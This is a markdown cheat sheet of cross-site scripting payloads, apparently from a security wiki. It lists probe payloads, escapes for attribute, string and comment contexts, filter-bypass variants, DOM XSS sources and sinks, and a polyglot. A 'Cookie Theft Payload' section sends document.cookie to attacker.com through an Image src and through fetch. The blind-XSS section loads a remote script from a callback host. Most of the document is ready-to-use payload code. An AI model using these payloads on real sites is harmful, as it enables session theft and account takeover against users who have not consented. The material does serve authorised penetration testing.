# XSS Payloads Cheatsheet

Quick reference. For theory and testing methodology see [[XSS-Overview]].

---

## Basic Test Payloads

Start here — these confirm XSS is possible before crafting a full exploit.

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
'"><script>alert(1)</script>
javascript:alert(1)
```

---

## Context Escaping

### Inside HTML Attribute (double-quoted)
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
```

### Inside HTML Attribute (single-quoted)
```html
' onmouseover='alert(1)
'><script>alert(1)</script>
```

### Inside JavaScript String (single-quoted)
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
```

### Inside JavaScript String (double-quoted)
```javascript
"-alert(1)-"
";alert(1)//
```

### Inside `<script>` Block (no quotes)
```javascript
</script><script>alert(1)</script>
```

### Inside HTML Comment
```html
--><script>alert(1)</script>
```

### Inside `href` Attribute
```javascript
javascript:alert(1)
javascript:alert(document.cookie)
```

---

## Filter Bypass

### Tag/Keyword Blocked

```html
<!-- script blocked → use other tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">

<!-- case variation -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### `alert` Blocked
```javascript
alert`1`
confirm(1)
prompt(1)
console.log(1)
// For blind XSS proof:
fetch('https://your-server.com/?c='+document.cookie)
```

### Parentheses Blocked
```javascript
alert`1`
throw/a/,alert`1`
```

### Space Blocked
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### Encoding Bypasses
```html
<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;  ← (for when they decode entities)

<!-- URL encoding inside href -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

---

## DOM XSS

DOM-based XSS doesn't touch the server — the payload is processed by client-side JS.

Common sources (attacker-controlled input):
```javascript
document.URL
document.location.hash
document.referrer
window.name
```

Common sinks (where the data gets written):
```javascript
document.innerHTML
document.write()
eval()
setTimeout(string)
location.href
```

Test payload in URL hash:
```
https://example.com/page#<img src=x onerror=alert(1)>
https://example.com/page#"><script>alert(1)</script>
```

---

## Cookie Theft Payload

```javascript
<script>
new Image().src='https://attacker.com/steal?c='+document.cookie
</script>

// Or fetch:
<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>
```

---

## Polyglot (Works in Multiple Contexts)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## Blind XSS

When you can't see the reflection but the payload might execute in an admin panel, logging system, or internal tool.

Use a callback URL so you get notified when it fires:
```html
<script src="https://your-xss-hunter.com/YOUR_PAYLOAD"></script>
```

Services: [XSS Hunter](https://xsshunter.com), [Canarytokens](https://canarytokens.org)

---

*Theory and testing methodology: [[XSS-Overview]] | Related: [[CSP]] | [[Browser-Security-Model]]*
